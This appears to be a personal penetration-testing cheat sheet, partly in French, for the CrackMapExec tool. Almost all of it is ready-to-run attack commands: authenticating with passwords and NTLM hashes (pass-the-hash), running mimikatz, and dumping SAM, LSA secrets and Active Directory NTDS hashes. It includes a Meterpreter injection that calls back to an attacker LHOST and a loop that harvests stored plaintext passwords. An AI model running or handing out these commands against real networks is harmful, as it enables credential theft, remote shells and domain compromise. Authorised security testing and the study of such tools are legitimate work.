## crackmapexec

* [https://github.com/byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
* [https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html) et les suivants


### nouvelle version (4)

Il faut préciser le protocole à utiliser.

Exemples :

`crackmapexec smb 192.168.1.1 -d domain.local -u admuser -p 'P@ssw0rd'`
`sudo crackmapexec smb 192.168.5.4 -d domain.local -u admuser -H <lmHash:ntHash> -M mimikatz`
`crackmapexec mssql 192.168.1.1 -d domain.local -u admuser -p 'P@ssw0rd' -q 'SELECT @@version'`
`crackmapexec mssql 192.168.2.3 -d domain.local -u admuser -p 'P@ssw0rd' --port 53757 -q 'SELECT name FROM master..sysdatabases;'`


### one-line sweeties

Extract all clear-text passwords from domain (to fill a wordlist).

```
for f in ~/.cme/workspaces/default/{smb,mssql}.db ; do
    sqlite3 "$f"  <<< 'select password from users where credtype = "plaintext";'
done | sort -u
```



### old releases (2 and 3)

#### recon

`crackmapexec 192.168.0.0/24`

#### exploit

using a password:
`crackmapexec <ipVictime> -d <domain|hostname> -u <username> -p <password> <commande>`
using a hash:
`crackmapexec <ipVictime> -d <domain|hostname> -u <username> -H <lmHash:ntHash> <commande>`

Commandes utiles avec des droits utilisateurs :

* `--users`
* `--sessions` : semble nécessiter des droits admin avec certains systèmes
* `--shares`

Commandes utiles avec des droits administrateurs :

* `--lusers` : logons users
* `--uac`
* `--sam` : base SAM locale
* `--lsa` : secrets LSA (peut contenir des mots de passe en clair)
* `--ntds drsuapi` : Récupère les hashs des comptes d'ordinateurs et d'utilisateurs de l'annuaire AD

Exemples :

`sudo crackmapexec 172.16.32.14 -d . -u Administrateur -H d8496c706d9f540ceef6a253d3dc45a0 -M mimikatz`
`sudo crackmapexec 172.16.32.14 -d . -u Administrateur -H d8496c706d9f540ceef6a253d3dc45a0 -M met_inject -o LHOST=172.16.41.230 LPORT=8443`

